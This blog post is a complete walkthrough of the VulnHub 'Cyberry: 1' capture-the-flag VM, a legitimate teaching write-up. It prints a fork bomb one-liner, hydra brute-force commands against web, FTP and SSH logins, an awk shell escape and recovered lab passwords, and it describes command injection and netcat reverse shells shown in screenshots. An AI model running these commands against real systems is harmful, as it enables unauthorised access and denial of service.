---
layout: post
last_modified_at: 2018-08-05 00:04:12 +0000d
title: "Cyberry: 1 Walkthrough"
subtitle: "I Love Berries!"
categories: Walkthrough
tags: [VulnHub, Cyberry]
comments: true
image:
  feature: cyberry-1-walkthrough.jpg
  credit: Bru-nO / Pixabay
  creditlink: https://pixabay.com/en/berries-raspberries-blackberries-3237884/
---

This post documents the complete walkthrough of Cyberry: 1,
a boot2root [VM][1] created by [Cyberry][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background
Cyberry are eagerly anticipating the release of their new "Berrypedia" website,
a life-long project which offers knowledge and insight into all things Berry!

## Information Gathering
Let's kick this off with a `nmap` scan to establish the services available in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.128
...
PORT    STATE  SERVICE REASON         VERSION
21/tcp  open   ftp     syn-ack ttl 64 ProFTPD 1.3.5b
22/tcp  open   ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 97:7c:74:2b:f1:28:15:dc:8d:67:e0:75:75:44:e9:ad (RSA)
|_  256 29:62:8e:10:9b:97:79:3a:18:e6:c0:0b:f7:ec:f8:ee (ECDSA)
80/tcp  open   http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Coming Soon
666/tcp closed doom    reset ttl 64
```

`nmap` finds three open ports—`21/tcp`, `22/tcp`, and `80/tcp`. I don't know what `666/tcp` is for—the gateway to Hell? Good thing it's closed then. Among the three open ports, `80/tcp`, commonly known as the web service, is the easiest to explore because the protocol (`http`) is well-documented and is in plain text. Let's start with that.

## Directory/File Enumeration

Let's identify the common directories and files with `gobuster` and `common.txt` from [SecLists](https://github.com/danielmiessler/SecLists).

```
Gobuster v1.1 OJ Reeves (@TheColonial)
=====================================================
[+] Mode : dir
[+] Url/Domain : http://192.168.198.128/
[+] Threads : 10
[+] Wordlist : /usr/share/seclists/Discovery/Web_Content/common.txt
[+] Status codes : 307,200,204,301,302
[+] Expanded : true
=====================================================
http://192.168.198.128/.bashrc (Status: 200)
http://192.168.198.128/css (Status: 301)
http://192.168.198.128/images (Status: 301)
http://192.168.198.128/index.html (Status: 200)
http://192.168.198.128/javascript (Status: 301)
http://192.168.198.128/phpmyadmin (Status: 301)
=====================================================
```

Everything looks normal execpt for `.bashrc`.

## Fork Bomb :bomb:

 Something sinister is lurking in `.bashrc`.

`alias ls='echo "Cyberry Intrusion Detection activated\nsystem failsafe mode will begin in:"; sleep 1; echo "5"; sleep 1; echo "4"; sleep 1; echo "3"; sleep 1; echo "2"; sleep 1; echo "1"; sleep 1; :(){ :|: & };:`

A fork bomb! A fork bomb replicates itself until it depletes system resources, causing your system to "hang". In this case, using `ls` will set off the fork bomb.

## HTML Comments

Another popular place to look for clues is in the HTML source code. Here, I find a couple of HTML comments that look like `base64`.

![comments.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-1.png)

Let's decode them.

```
# curl -s 192.168.198.128 | sed -n '/<!--/,/-->/p' | tr -cd 'a-zA-Z0-9=\n' > base64.txt
```
```
# for b in $(cat base64.txt); do (echo $b | base64 -d && echo); done
nice try!
nothing to see here!
time to move on!
secretfile.html
work-in-progress.png
```

A request for `/secretfile.html` reveals more binary strings.

```
curl -i 192.168.198.128/secretfile.html
HTTP/1.1 200 OK
Date: Mon, 22 Jan 2018 15:09:17 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Thu, 23 Nov 2017 22:05:33 GMT
ETag: "f4-55eada29aaddf"
Accept-Ranges: bytes
Content-Length: 244
Vary: Accept-Encoding
Content-Type: text/html

<html>
<head>
<body>
<p><b>Congratulations... you must be an uberhacker!</b></p>
<br />
<br />
<p>Can you progress any further?? </p>
<br />
<br />

<p>01100010 01101111 01110011 01110011 00101110 01100111 01101001 01100110</p>
</body>
</html>
```

The binary strings decode to the following.

```
for b in 01100010 01101111 01110011 01110011 00101110 01100111 01101001 01100110; do printf "%02x" $((2#$b)); done | xxd -p -r && echo
boss.gif
```
`¯\_(ツ)_/¯`

![boss.gif](/assets/images/posts/cyberry-1-walkthrough/boss.gif)

A request for `/work-in-progress.png` results in the following.

```
# curl -i 192.168.198.128/work-in-progress.png
HTTP/1.1 200 OK
Date: Mon, 22 Jan 2018 15:11:43 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Thu, 23 Nov 2017 22:36:20 GMT
ETag: "7-55eae10af2388"
Accept-Ranges: bytes
Content-Length: 7
Content-Type: image/png

edocrq
```

Notice that the flip side of "edocrq" is "qrcode"?

The file `edocrq` is available from the web server and it looks like this.

![edocrq.png](/assets/images/posts/cyberry-1-walkthrough/edocrq.png)

Flip it horizontally to decode, as in the flipping of "edocrq" to "qrcode"

![qrcode.png](/assets/images/posts/cyberry-1-walkthrough/qrcode.png)

It decodes to `/berrypedia.html`.

## Directory/File Enumeration (2)

`dirbuster` reaches the same conclusion without going through the hard way. Duh?!

```
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: /images/ - 200
Dir found: / - 200
File found: /welcome.php - 302
Dir found: /coming-soon-files/ - 200
Dir found: /icons/ - 403
File found: /coming-soon-files/jquery_002.js - 200
Dir found: /css/ - 200
File found: /coming-soon-files/jquery.js - 200
File found: /coming-soon-files/a.html - 200
File found: /logout.php - 302
Dir found: /javascript/ - 403
Dir found: /coming-soon-files/a_data/ - 200
File found: /css/style.css - 200
File found: /coming-soon-files/css.css - 200
File found: /coming-soon-files/font-awesome.css - 200
File found: /config.php - 200
File found: /coming-soon-files/style.css - 200
File found: /coming-soon-files/a_data/inject.css - 200
File found: /login.php - 200
File found: /register.php - 200
File found: /berrypedia.html - 200
Dir found: /phpmyadmin/ - 200
Dir found: /server-status/ - 403
DirBuster Stopped
```

## Login Page

The login page has a weakness—it leaks information about the existence of a user.

_If the user doesn't exists_

![non-exist.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-5.png)

_If the user exists and the password is invalid_

![exist.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-6.png)

With this in mind, let's do a online password cracking with `hydra`.

```
# hydra -l root -P /usr/share/wordlists/rockyou.txt -f -e sr 192.168.198.128 http-post-form "/login.php:username=^USER^&password=^PASS^:not valid"
[80][http-post-form] host: 192.168.198.128 login: root password: password
```

## Berrypedia Admin Panel

It's a shame that `password` is not the SSH password for `root`. I can log in to the admin panel, and … there's nothing interesting to see.

![panel.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-7.png)

## phpMyAdmin 4.6.6

PMA is present as well, which is another way of saying the machine runs PHP.

![pma.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-2_2.png)

## Berrypedia

A request for `/berrypedia.html` reveals the following page.

![berrypedia.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-8.png)

Elderberry is a hyperlink to an interesting file—`/placeho1der.jpg`.

![placeho1der.jpg](/assets/images/posts/cyberry-1-walkthrough/placeho1der.jpg)

## Solving the Puzzle

Here's how to reveal the puzzle:

* Flip the image vertically
* Invert the colors

You're welcome.

![puzzle.jpg](/assets/images/posts/cyberry-1-walkthrough/puzzle.jpg)

<ol start='0'>
    <li>Port of Tacoma</li>
    <li>Smiley Lewis (1955)</li>
    <li>Dave Edmund (1970)</li>
    <li>Gale Storm (1955)</li>
    <li>Fats Domino (1961)</li>
</ol>

The photo of each person is intentionally flipped to throw you off when you search in Google Images.

The common denominator that links each person is the song "_I Hear You Knocking_". Each of them had covered the song at some point. Together with Port of Tacoma, it's obvious that we are looking at port-knocking here.

Port-knocking requires sending network packets with the `SYN` flag set, to a sequence of ports in the correct order. The cover year of the song makes it a good starting point to guess the correct sequence.

## Knockin' on Heaven's Door

To that end, I wrote a port-knocking script using `nmap`.

<div class="filename"><span>knock.sh</span></div>
```
#!/bin/bash

TARGET=$1

for ports in $(cat permutation.txt); do
    echo "[*] Trying sequence $ports..."
    for p in $(echo $ports | tr ',' ' '); do
        nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET
    done
    sleep 3
    nmap -n -v -Pn -p- -A --reason $TARGET -oN ${ports}.txt
done
```

`permutation.txt` contains all the permutations of 1955, 1955, 1961 and 1970 and I use Python to generate it.

```
# python -c 'import itertools; print list(itertools.permutations([1955,1955,1961,1970]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq
1955,1955,1961,1970
1955,1955,1970,1961
1955,1961,1955,1970
1955,1961,1970,1955
1955,1970,1955,1961
1955,1970,1961,1955
1961,1955,1955,1970
1961,1955,1970,1955
1961,1970,1955,1955
1970,1955,1955,1961
1970,1955,1961,1955
1970,1961,1955,1955
```

When the script reaches the sequence `1970,1955,1955,1961`, the port `61955/tcp` appears.

```
61955/tcp open   http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Coming Soon
```

Another similar site appears to be running at `61955/tcp`.

![reloaded.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-3.png)

Let's repeat another round of directory enumeration with `gobuster` on this site.

```
Gobuster v1.1 OJ Reeves (@TheColonial)
=====================================================
[+] Mode : dir
[+] Url/Domain : http://192.168.198.128:61955/
[+] Threads : 10
[+] Wordlist : /usr/share/seclists/Discovery/Web_Content/common.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded : true
=====================================================
http://192.168.198.128:61955/H (Status: 200)
http://192.168.198.128:61955/css (Status: 301)
http://192.168.198.128:61955/image (Status: 301)
http://192.168.198.128:61955/images (Status: 301)
http://192.168.198.128:61955/index.html (Status: 200)
http://192.168.198.128:61955/javascript (Status: 301)
http://192.168.198.128:61955/js (Status: 301)
http://192.168.198.128:61955/phpmyadmin (Status: 301)
=====================================================
```

A request for `http://192.168.198.128:61955/H` reveals something interesting.

```
# curl 192.168.198.128:61955/H
++++++++++[>+++++++>++++++++++>+++>+<<<<-]>++.>+.+++++++..+++.>++.<<+++++++++++++++.>.+++.------.--------.>+.>.
///////////////////////////////////////////////////////////////////////////////////////////////////////////////



--------[-->+++<]>.+++[->+++<]>.----.++++++++++++.[->+++++<]>-.+[----->+<]>.--------.++++++++.-----------.+++.+++++++++++++.+.

--[----->+<]>---.+++++.[--->+<]>---.+[->+++<]>+.++++++++.

+[----->+++<]>+.-------.+++++++++++..-------.

+[------->++<]>.-----.------.++++++++.

--------[-->+++<]>.+++[->+++<]>.+++++++++++++..+++++++.

+[------->++<]>-.------------.--[--->+<]>---.+++++++.

+[----->+++<]>++++.------.+++++++++++++..+++++++.

+[------->++<]>++.+++++++.-[-->+<]>-.[-->+<]>+++.[->+++<]>++.-.++++++++++.------.++++++++++.---------..
```

## Brainfuck

Despite its strange looking form, what you see above is the esoteric [Brainfuck][4] language. An online [interpreter][5] deciphers it to the following.

```
Hello World!
team members
chuck
halle
nick
terry
mary
kerry
pw: bakeoff
```

OK. I have the team members' names and a password but to whom does the password belong to? I can verify it using `hydra`.

```
# hydra -L members.txt -p bakeoff -f ftp://192.168.198.128
[21][ftp] host: 192.168.198.128 login: mary password: bakeoff

# hydra -L members.txt -p bakeoff -f ssh://192.168.198.128
[22][ssh] host: 192.168.198.128 login: mary password: bakeoff
```

The password to both `ftp` and `ssh` is `bakeoff`. Although it's a pity that `mary` doesn't have a shell, I'm sure we'll have better luck with `ftp`.

## FTP Access

![ftp.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-9.png)

Notice that `.bash_history` is a directory? This is unusual and worth taking a closer look.

![.bash_history.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-10.png)

`.reminder.enc` is a ciphertext encrypted with `openssl` while `.trash` is a list of common passwords.

```
# cat .trash
Most common passwords 2017 (Top 10)

123456
123456789
qwerty
12345678
111111
1234567890
1234567
password
123123
987654321
```

## Decryption of `.reminder.enc`

It makes sense to use the passwords above to decrypt the file but I wouldn't know which cipher. To that end, I wrote this `bash` script to try all available ciphers until something clicks.

<div class="filename"><span>decrypt.sh</span></div>
```bash
#!/bin/bash

FILE=.reminder.enc

for c in $(cat ciphers.txt); do
    for pw in $(sed -n 3,12p .trash); do
        openssl enc $c -d -salt -in $FILE -pass pass:$pw -out /dev/null &>/dev/null
        if [ $? -eq 0 ]; then
            dec=$(openssl enc $c -d -salt -in $FILE -pass pass:$pw | tr -cd '[:print:]')
            if [ $? -eq 0 ]; then
                echo "[*] Trying $c with $pw"
                printf "%s\n\n" "$dec"
                break
            fi
        fi
    done
done
```

`ciphers.txt` contains all the ciphers. Running the script reveals the following.

![decrypted.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-2.png)

It certainly looks like some sort of password.

## Login Page (2)

Recall from above the site has a login page to the Berrypedia Admin Panel? Well, this site has a login page as well.

![login.php.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-11.png)

Let's try this credential (`mary:dangleberry69`) and see what we get.

![secure.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-12.png)

Good, I'm in.

## Secure Section

In the secure section, there's a page that appears to do `nslookup` and the `host` parameter has two defined values: **google.com** and **yahoo.com**.

![nslookup.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-13.png)

Let's see if we can exploit the `host` parameter to execute remote commands.

![remote-command.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-14.png)

Bingo, I can run a reverse shell with `netcat`.

![nc.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-15.png)

![reverse-shell.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-16.png)

Awesome.

## Learning the `root` Dance

I spot an interesting file at `/var/www/html-secure/ub3r-s3cur3` during enumeration of the `www-data` account.

![secure.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-17.png)

It's a list of Latin words. Perhaps it's another password list that I can use to brute-force SSH?

```
hydra -L members.txt -P nb-latin -f ssh://192.168.198.128
[22][ssh] host: 192.168.198.128 login: nick password: custodio
```

The password to `nick`'s account is `custodio`.

## Unstacking the `sudo` Russian Doll

Here's where the crazy `sudo` Russian doll fun begins.

![nick.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-19.png)

It appears that `/home/nick/invoke.sh` is a script that runs any executable as `terry`.

![invoke.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-20.png)

Let's try to open a shell as `terry`. But before we do that, recall that a `fork()` bomb is present in `.bashrc`? One of the users may have this as a defense mechanism when `/bin/bash` is their shell. It's better to use good old `/bin/sh` instead. It isn't pretty but it works.

![terry.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-21.png)

You can escape to shell with `awk` like so.
```awk
awk 'BEGIN { system("/bin/sh") }'
```

![halle.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-22.png)

PHP can run shell commands too. Let's run a reverse shell back using `netcat`.

![nc.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-23.png)

On my `netcat` listener, a reverse shell connects.

![terry.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-24.png)

Let's spawn a pseudo-tty.

![pty.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-25.png)

At long last, the buck stops here.

![stop.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-26.png)

At the home directory of `chuck` there's still something interesting to look out for.

![deleted.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-27.png)

The file `/home/chuck/.deleted/deleted` provides hints to the `root` password.

## Guessing the `root` Password

Here's what we know about the `root` password.

```
The password starts with "che" and ends with "rry"

letter "e" appears three times
letter "c" appears twice
letter "r" appears twice
letter "b" appears twice
letter "a" appears twice

The other letters in the password are "h", "w", "m", and "y"

It's a concatenated 4-word password

There's a 99% chance one of the words is a latin word: baca
```

I know the first 3 characters of the first word and the last 3 characters of the last word. Between the first and last word are the Latin word "baca" and another unknown word.

The first word must contain the following:

* "che" at the beginning; and
* one "b" (another "b" is in "baca"); or
* one "m"; or
* one "w"

I use the following command to find the first word—by eliminating the characters that shouldn't appear, and if it's a word from a dictionary.

```
# for word in $(grep -E '^che' /usr/share/dict/words | tr -cd 'chebmw\n' | sort | uniq | tr '\n' ' '); do grep -Eo "^$word$" /usr/share/dict/words; done
chew
```

The last word must contain the following:

* one "b" (another "b" is in "baca"); or
* at least one "e" (another "e" is in "che"); or
* one "m"; and
* "rry" at the end


Similarly, I use the following command to find the last word.

```
# for word in $(grep -E 'rry$' /usr/share/dict/words | tr -cd 'bemrry\n' | sort | uniq | tr '\n' ' '); do grep -Eo "^$word$" /usr/share/dict/words; done
berry
merry
```

It's now trivial to find the remaining word. When the last word is "berry", the remaining word has to be "me" to meet the constraints. Conversely, when the last word is "merry" the remaining word has to be "be".

Armed with this information, there are 4 possible outcomes that meet all the constraints.

```
chewbacameberry
chewmebacaberry
chewbacabemerry
chewbebacamerry
```

One of the above has to be the `root` password. Using `hydra`, verifying the password is simple.

```
# hydra -l root -P passwords.txt -f ssh://192.168.198.128
[22][ssh] host: 192.168.198.128 login: root password: chewbacabemerry
```

## I Know the `root` Dance

![root-dance.png](/assets/images/posts/cyberry-1-walkthrough/cyberry-18.png)

:dancer:

[1]: https://www.vulnhub.com/entry/cyberry-1,217/
[2]: https://twitter.com/@cyberrysec
[3]: https://www.vulnhub.com
[4]: https://en.wikipedia.org/wiki/Brainfuck
[5]: https://copy.sh/brainfuck/

*[PMA]: phpMyAdmin
